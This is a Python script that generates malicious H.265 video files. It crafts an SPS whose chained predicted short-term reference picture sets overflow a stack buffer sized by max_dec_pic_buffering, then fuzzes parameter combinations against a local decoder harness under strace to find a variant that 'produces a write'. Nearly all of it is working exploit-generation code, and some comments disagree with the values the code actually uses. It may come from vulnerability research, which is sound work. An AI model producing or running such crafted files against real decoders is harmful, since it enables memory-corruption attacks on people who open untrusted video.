#!/usr/bin/env python3
"""
Create H.265 file with malicious SPS exploiting short-term reference picture sets.
We already know that we can overflow a buffer in the stack, but we need to fuzz the different stack overflow combinations to find one that produces a write.
Chain multiple prediction levels to exceed stack-allocated buffers of size max_dec_pic_buffering_1 
Based on proper H.265 structure
"""

import struct
import os
        
num_negative = 0
num_positive = 0
max_buffering=0
nsets=0
class BitstreamWriter:
    """Bit-level writer for H.265 bitstream construction"""
    
    def __init__(self):
        self.data = bytearray()
        self.current_byte = 0
        self.bit_position = 0
    
    def write_bit(self, bit):
        """Write a single bit"""
        if bit:
            self.current_byte |= (1 << (7 - self.bit_position))
        self.bit_position += 1
        
        if self.bit_position == 8:
            self.data.append(self.current_byte)
            self.current_byte = 0
            self.bit_position = 0
    
    def write_bits(self, value, num_bits):
        """Write multiple bits"""
        for i in range(num_bits - 1, -1, -1):
            bit = (value >> i) & 1
            self.write_bit(bit)
    
    def write_ue(self, value):
        """Write unsigned exp-golomb coded value"""
        if value == 0:
            self.write_bit(1)
            return
        
        # Calculate number of leading zeros
        value_plus_1 = value + 1
        num_bits = value_plus_1.bit_length()
        leading_zeros = num_bits - 1
        
        # Write leading zeros
        for _ in range(leading_zeros):
            self.write_bit(0)
        
        # Write the value with leading 1
        self.write_bits(value_plus_1, num_bits)
    
    def write_se(self, value):
        """Write signed exp-golomb coded value"""
        if value <= 0:
            mapped = -2 * value
        else:
            mapped = 2 * value - 1
        self.write_ue(mapped)
    
    def byte_align(self):
        """Align to byte boundary with rbsp_stop_one_bit"""
        if self.bit_position != 0:
            self.write_bit(1)  # rbsp_stop_one_bit
            while self.bit_position != 0:
                self.write_bit(0)  # rbsp_alignment_zero_bit
    
    def get_bytes(self):
        """Get the final byte array"""
        result = bytearray(self.data)
        if self.bit_position != 0:
            result.append(self.current_byte)
        return bytes(result)

def emulation_prevention(data):
    """Add emulation prevention bytes (0x03) after 0x000000, 0x000001, 0x000002, 0x000003"""
    result = bytearray()
    zero_count = 0
    
    for byte in data:
        if zero_count == 2 and byte <= 0x03:
            result.append(0x03)  # Emulation prevention byte
            zero_count = 0
        
        result.append(byte)
        
        if byte == 0x00:
            zero_count += 1
        else:
            zero_count = 0
    
    return bytes(result)

def create_h265_with_malicious_strps():
    """Create H.265 file with malicious SPS"""
    
    # H.265 NAL unit types
    NAL_TYPE_VPS = 32
    NAL_TYPE_SPS = 33
    NAL_TYPE_PPS = 34
    NAL_TYPE_IDR_W_RADL = 19
    
    # === VPS (Video Parameter Set) - NAL type 32 ===
    vps_data = create_vps()
    
    # === SPS (Sequence Parameter Set) - NAL type 33 ===
    sps_data = create_malicious_sps()
    
    # === PPS (Picture Parameter Set) - NAL type 34 ===
    pps_data = create_pps()
    
    # === IDR Slice - NAL type 19 ===
    idr_data = create_idr_slice()
    
    # Create the complete H.265 file with Annex B format
    h265_data = bytearray()
    
    # Add VPS
    h265_data.extend([0x00, 0x00, 0x00, 0x01])  # Start code
    h265_data.extend(create_nal_header(NAL_TYPE_VPS, 0, 1))
    h265_data.extend(vps_data)
    
    # Add SPS
    h265_data.extend([0x00, 0x00, 0x00, 0x01])  # Start code
    h265_data.extend(create_nal_header(NAL_TYPE_SPS, 0, 1))
    h265_data.extend(sps_data)
    
    # Add PPS
    h265_data.extend([0x00, 0x00, 0x00, 0x01])  # Start code
    h265_data.extend(create_nal_header(NAL_TYPE_PPS, 0, 1))
    h265_data.extend(pps_data)
    
    # Add IDR slice
    h265_data.extend([0x00, 0x00, 0x00, 0x01])  # Start code
    h265_data.extend(create_nal_header(NAL_TYPE_IDR_W_RADL, 0, 1))
    h265_data.extend(idr_data)
    
    return bytes(h265_data)

def create_nal_header(nal_type, nuh_layer_id, nuh_temporal_id_plus1):
    """Create proper 2-byte H.265 NAL unit header"""
    # Byte 1: forbidden_zero_bit(1) + nal_unit_type(6) + nuh_layer_id_MSB(1)
    byte1 = (0 << 7) | (nal_type << 1) | ((nuh_layer_id >> 5) & 0x01)
    
    # Byte 2: nuh_layer_id_LSB(5) + nuh_temporal_id_plus1(3)
    byte2 = ((nuh_layer_id & 0x1F) << 3) | (nuh_temporal_id_plus1 & 0x07)
    
    return bytes([byte1, byte2])

def create_vps():
    """Create minimal VPS"""
    bs = BitstreamWriter()
    
    # vps_video_parameter_set_id
    bs.write_bits(0, 4)  # vps_id = 0
    
    # vps_base_layer_internal_flag
    bs.write_bit(1)
    
    # vps_base_layer_available_flag
    bs.write_bit(1)
    
    # vps_max_layers_minus1
    bs.write_bits(0, 6)  # 0 layers
    
    # vps_max_sub_layers_minus1
    bs.write_bits(0, 3)  # 1 sub-layer
    
    # vps_temporal_id_nesting_flag
    bs.write_bit(1)
    
    # vps_reserved_0xffff_16bits
    bs.write_bits(0xFFFF, 16)
    
    # profile_tier_level
    write_profile_tier_level(bs, True, 0)
    
    # vps_sub_layer_ordering_info_present_flag
    bs.write_bit(1)
    
    # For each sub-layer (just 0)
    bs.write_ue(1)  # vps_max_dec_pic_buffering_minus1[0]
    bs.write_ue(0)  # vps_max_num_reorder_pics[0]
    bs.write_ue(0)  # vps_max_latency_increase_plus1[0]
    
    # vps_max_layer_id
    bs.write_bits(0, 6)
    
    # vps_num_layer_sets_minus1
    bs.write_ue(0)
    
    # vps_timing_info_present_flag
    bs.write_bit(0)
    
    # vps_extension_flag
    bs.write_bit(0)
    
    bs.byte_align()
    return emulation_prevention(bs.get_bytes())

def write_profile_tier_level(bs, profile_present_flag, max_sub_layers_minus1):
    """Write profile_tier_level structure"""
    if profile_present_flag:
        # general_profile_space
        bs.write_bits(0, 2)
        
        # general_tier_flag
        bs.write_bit(0)
        
        # general_profile_idc (1 = Main profile)
        bs.write_bits(1, 5)
        
        # general_profile_compatibility_flag[32]
        for i in range(32):
            bs.write_bit(1 if i == 1 else 0)  # Compatible with Main profile
        
        # general_progressive_source_flag
        bs.write_bit(1)
        
        # general_interlaced_source_flag
        bs.write_bit(0)
        
        # general_non_packed_constraint_flag
        bs.write_bit(1)
        
        # general_frame_only_constraint_flag
        bs.write_bit(1)
        
        # 44 reserved zero bits
        for _ in range(44):
            bs.write_bit(0)
    
    # general_level_idc (93 = Level 3.1)
    bs.write_bits(93, 8)
    
    # sub_layer_profile_present_flag and sub_layer_level_present_flag
    for i in range(max_sub_layers_minus1):
        bs.write_bit(0)  # sub_layer_profile_present_flag[i]
        bs.write_bit(0)  # sub_layer_level_present_flag[i]

def create_malicious_sps():
    """Create SPS with malicious short-term reference picture sets"""
    bs = BitstreamWriter()
    
    # sps_video_parameter_set_id
    bs.write_bits(0, 4)  # vps_id = 0
    
    # sps_max_sub_layers_minus1
    bs.write_bits(0, 3)  # 1 sub-layer
    
    # sps_temporal_id_nesting_flag
    bs.write_bit(1)
    
    # profile_tier_level
    write_profile_tier_level(bs, True, 0)
    
    # sps_seq_parameter_set_id
    bs.write_ue(0)
    
    # chroma_format_idc (1 = 4:2:0)
    bs.write_ue(1)
    
    # pic_width_in_luma_samples
    bs.write_ue(1920)
    
    # pic_height_in_luma_samples
    bs.write_ue(1080)
    
    # conformance_window_flag
    bs.write_bit(0)
    
    # bit_depth_luma_minus8
    bs.write_ue(0)
    
    # bit_depth_chroma_minus8
    bs.write_ue(0)
    
    # log2_max_pic_order_cnt_lsb_minus4
    bs.write_ue(4)
    
    # sps_sub_layer_ordering_info_present_flag
    bs.write_bit(1)
    
    # CRITICAL: Set max_dec_pic_buffering to 8
    MAX_DEC_PIC_BUFFERING_1 = max_buffering
    bs.write_ue(MAX_DEC_PIC_BUFFERING_1 - 1)  # sps_max_dec_pic_buffering_minus1[0] = 7
    bs.write_ue(2)  # sps_max_num_reorder_pics[0]
    bs.write_ue(0)  # sps_max_latency_increase_plus1[0]
    
    # log2_min_luma_coding_block_size_minus3
    bs.write_ue(0)  # 8x8
    
    # log2_diff_max_min_luma_coding_block_size
    bs.write_ue(3)  # 64x64 max
    
    # log2_min_luma_transform_block_size_minus2
    bs.write_ue(0)  # 4x4
    
    # log2_diff_max_min_luma_transform_block_size
    bs.write_ue(3)  # 32x32 max
    
    # max_transform_hierarchy_depth_inter
    bs.write_ue(1)
    
    # max_transform_hierarchy_depth_intra
    bs.write_ue(1)
    
    # scaling_list_enabled_flag
    bs.write_bit(0)
    
    # amp_enabled_flag
    bs.write_bit(1)
    
    # sample_adaptive_offset_enabled_flag
    bs.write_bit(1)
    
    # pcm_enabled_flag
    bs.write_bit(0)
    
    # === MALICIOUS SHORT-TERM REFERENCE PICTURE SETS ===
    print("\n" + "="*70)
    print("CREATING MALICIOUS SHORT-TERM REFERENCE PICTURE SETS")
    print(f"max_dec_pic_buffering_1 = {MAX_DEC_PIC_BUFFERING_1}")
    print(f"Target: Create chain that exceeds limit by 5")
    print("="*70)
    
    # num_short_term_ref_pic_sets = 6 (indices 0-5)
    NUM_SETS = nsets 
    bs.write_ue(NUM_SETS)
    
    # Track computed counts for predictions
    computed_counts = {}
    
    # Write all 6 sets
    for i in range(NUM_SETS):
        write_malicious_st_ref_pic_set(bs, i, MAX_DEC_PIC_BUFFERING_1, computed_counts)
    
    # long_term_ref_pics_present_flag
    bs.write_bit(0)
    
    # sps_temporal_mvp_enabled_flag
    bs.write_bit(1)
    
    # strong_intra_smoothing_enabled_flag
    bs.write_bit(1)
    
    # vui_parameters_present_flag
    bs.write_bit(0)
    
    # sps_extension_present_flag
    bs.write_bit(0)
    
    bs.byte_align()
    
    print("\n" + "="*70)
    
    return emulation_prevention(bs.get_bytes())

def write_malicious_st_ref_pic_set(bs, idx, max_dec_pic_buffering_1, computed_counts):
    """Write malicious short-term reference picture set with chained predictions"""
    
    print(f"\n--- Writing Short-Term Ref Pic Set {idx} ---")
    
    if idx == 0:
        # Set 0: Base set with 4 negative + 4 positive = 8 (at limit)
        bs.write_bit(0)  # No prediction for first set
        
        #num_negative = 0
        #num_positive = 0
        
        print(f"Set {idx}: NON-PREDICTION mode")
        print(f"  num_negative_pics = {num_negative}")
        print(f"  num_positive_pics = {num_positive}")
        print(f"  Total = {num_negative + num_positive} (AT LIMIT)")
        
        bs.write_ue(num_negative)
        bs.write_ue(num_positive)
        
        # Write negative pics
        for i in range(num_negative):
            bs.write_ue(0)  # delta_poc_s0_minus1 = 0 (delta = -1)
            bs.write_bit(1)  # used_by_curr_pic_s0_flag = 1
        
        # Write positive pics
        for i in range(num_positive):
            bs.write_ue(0)  # delta_poc_s1_minus1 = 0 (delta = +1)
            bs.write_bit(1)  # used_by_curr_pic_s1_flag = 1
        
        computed_counts[idx] = {
            'num_negative': num_negative,
            'num_positive': num_positive,
            'total': num_negative + num_positive
        }
    
    else:
        # Sets 1-5: Prediction mode, each adds 1 more
        bs.write_bit(1)  # inter_ref_pic_set_prediction_flag = 1
        
        # Reference the previous set (delta_idx = 1)
        # For set idx < num_short_term_ref_pic_sets, we don't write delta_idx
        # It's only written when idx == num_short_term_ref_pic_sets
        
        # delta_rps_sign = 0, abs_delta_rps_minus1 = 0
        # This gives delta_rps = (1 - 2*0) * (0+1) = 1 (positive)
        bs.write_bit(0)  # delta_rps_sign = 0
        bs.write_ue(0)   # abs_delta_rps_minus1 = 0 → delta_rps = 1
        
        ref_idx = idx - 1
        ref_total = computed_counts[ref_idx]['total']
        num_delta_pocs = ref_total
        
        print(f"Set {idx}: PREDICTION mode (references Set {ref_idx})")
        print(f"  delta_rps = 1 (positive)")
        print(f"  num_delta_pocs from ref = {num_delta_pocs}")
        
        # Write flags for all reference pics + delta_rps entry
        # Setting all used_by_curr_pic_flag = 1 means use_delta_flag is implicitly 1
        for i in range(num_delta_pocs + 1):
            bs.write_bit(1)  # used_by_curr_pic_flag = 1
            # When used_by_curr_pic_flag=1, use_delta_flag is implicitly 1
        
        # Calculate expected result
        # According to the vulnerable code:
        # - All previous entries get copied
        # - delta_rps (positive) adds one more to positive pics
        expected_negative = num_delta_pocs  # All previous
        expected_positive = 1  # Just delta_rps
        expected_total = expected_negative + expected_positive
        
        computed_counts[idx] = {
            'num_negative': expected_negative,
            'num_positive': expected_positive,
            'total': expected_total
        }
        
        print(f"  Expected num_negative_pics = {expected_negative}")
        print(f"  Expected num_positive_pics = {expected_positive}")
        print(f"  Expected Total = {expected_total}")
        

def create_pps():
    """Create minimal PPS"""
    bs = BitstreamWriter()
    
    # pps_pic_parameter_set_id
    bs.write_ue(0)
    
    # pps_seq_parameter_set_id
    bs.write_ue(0)
    
    # dependent_slice_segments_enabled_flag
    bs.write_bit(0)
    
    # output_flag_present_flag
    bs.write_bit(0)
    
    # num_extra_slice_header_bits
    bs.write_bits(0, 3)
    
    # sign_data_hiding_enabled_flag
    bs.write_bit(0)
    
    # cabac_init_present_flag
    bs.write_bit(0)
    
    # num_ref_idx_l0_default_active_minus1
    bs.write_ue(0)
    
    # num_ref_idx_l1_default_active_minus1
    bs.write_ue(0)
    
    # init_qp_minus26
    bs.write_se(0)
    
    # constrained_intra_pred_flag
    bs.write_bit(0)
    
    # transform_skip_enabled_flag
    bs.write_bit(0)
    
    # cu_qp_delta_enabled_flag
    bs.write_bit(0)
    
    # pps_cb_qp_offset
    bs.write_se(0)
    
    # pps_cr_qp_offset
    bs.write_se(0)
    
    # pps_slice_chroma_qp_offsets_present_flag
    bs.write_bit(0)
    
    # weighted_pred_flag
    bs.write_bit(0)
    
    # weighted_bipred_flag
    bs.write_bit(0)
    
    # transquant_bypass_enabled_flag
    bs.write_bit(0)
    
    # tiles_enabled_flag
    bs.write_bit(0)
    
    # entropy_coding_sync_enabled_flag
    bs.write_bit(0)
    
    # pps_loop_filter_across_slices_enabled_flag
    bs.write_bit(1)
    
    # deblocking_filter_control_present_flag
    bs.write_bit(0)
    
    # pps_scaling_list_data_present_flag
    bs.write_bit(0)
    
    # lists_modification_present_flag
    bs.write_bit(0)
    
    # log2_parallel_merge_level_minus2
    bs.write_ue(0)
    
    # slice_segment_header_extension_present_flag
    bs.write_bit(0)
    
    # pps_extension_present_flag
    bs.write_bit(0)
    
    bs.byte_align()
    return emulation_prevention(bs.get_bytes())

def create_idr_slice():
    """Create minimal IDR slice"""
    bs = BitstreamWriter()
    
    # first_slice_segment_in_pic_flag
    bs.write_bit(1)
    
    # no_output_of_prior_pics_flag
    bs.write_bit(0)
    
    # slice_pic_parameter_set_id
    bs.write_ue(0)
    
    # slice_type (2 = I slice)
    bs.write_ue(2)
    
    # slice_pic_order_cnt_lsb
    bs.write_bits(0, 8)  # 8 bits based on log2_max_pic_order_cnt_lsb_minus4=4
    
    # short_term_ref_pic_set_sps_flag
    bs.write_bit(1)
    
    # short_term_ref_pic_set_idx
    bs.write_bits(0, 3)  # Index 0 (3 bits for 6 sets: log2(6) ≈ 3)
    
    # slice_qp_delta
    bs.write_se(0)
    
    # slice_loop_filter_across_slices_enabled_flag
    bs.write_bit(1)
    
    bs.byte_align()
    
    # Add some dummy slice data (minimal)
    data = bs.get_bytes()
    return emulation_prevention(data)

def main():
    
    h265_data = create_h265_with_malicious_strps()
    
    # Write to file
    filename = 'malicious_h265_chain.h265'
    with open(filename, 'wb') as f:
        f.write(h265_data)
    
    print(f"\n✓ Created {filename} with {len(h265_data)} bytes")
    
    # Analyze NAL units
    print("\n=== NAL Unit Analysis ===")
    i = 0
    nal_count = 0
    while i < len(h265_data) - 4:
        if h265_data[i:i+4] == b'\x00\x00\x00\x01':
            if i + 6 < len(h265_data):
                nal_type = (h265_data[i+4] >> 1) & 0x3f
                nuh_layer_id = ((h265_data[i+4] & 0x01) << 5) | ((h265_data[i+5] >> 3) & 0x1F)
                nuh_temporal_id = h265_data[i+5] & 0x07
                
                nal_names = {
                    32: "VPS (Video Parameter Set)",
                    33: "SPS (Sequence Parameter Set) ⚠️  MALICIOUS!",
                    34: "PPS (Picture Parameter Set)",
                    19: "IDR_W_RADL (IDR slice)"
                }
                
                name = nal_names.get(nal_type, f"Unknown type {nal_type}")
                nal_count += 1
                print(f"NAL {nal_count} @ offset {i:04x}: type {nal_type:2d} - {name}")
            i += 4
        else:
            i += 1
    

def run_fuzzing_campaign():
    """
    Systematic fuzzing campaign to test H.265 parser with various malicious configurations.
    
    Tests different combinations of:
    - num_ref_pic_sets: Number of short-term reference picture sets (0-6)
    - max_dec_pic_buffering: Maximum decoded picture buffer size (0-6)
    - num_negative_pics: Number of negative reference pictures (0-2)
    - num_positive_pics: Number of positive reference pictures (0-2)
    """
    
    # Parameter ranges
    num_ref_pic_sets_range = range(7)      # 0-6 reference picture sets
    max_buffering_range = range(7)         # 0-6 max buffer size
    num_negative_range = range(3)          # 0-2 negative pictures
    num_positive_range = range(3)          # 0-2 positive pictures
    
    total_test_cases = 0
    
    # Execute fuzzing matrix
    for ref_sets in num_ref_pic_sets_range:
        for max_buf in max_buffering_range:
            for neg_pics in num_negative_range:
                for pos_pics in num_positive_range:
                    
                    # Set global parameters for this test case
                    global num_negative, num_positive, max_buffering, nsets
                    num_negative = neg_pics
                    num_positive = pos_pics
                    max_buffering = max_buf
                    nsets = ref_sets
                    
                    # Generate and test malicious H.265 file
                    main()
                    
                    # Test with strace to monitor system calls and potential crashes
                    test_result = os.system("strace ./test_h265_file ./malicious_h265_chain.h265")
                    
                    # Log test case parameters
                    print(f"Test case {total_test_cases}: ref_sets={ref_sets}, max_buf={max_buf}, neg={neg_pics}, pos={pos_pics}")
                    print(f"Exit code: {test_result}")
                    print("-" * 60)
                    
                    total_test_cases += 1
    
    print(f"Fuzzing campaign completed: {total_test_cases} test cases executed")


if __name__ == '__main__':
    run_fuzzing_campaign()

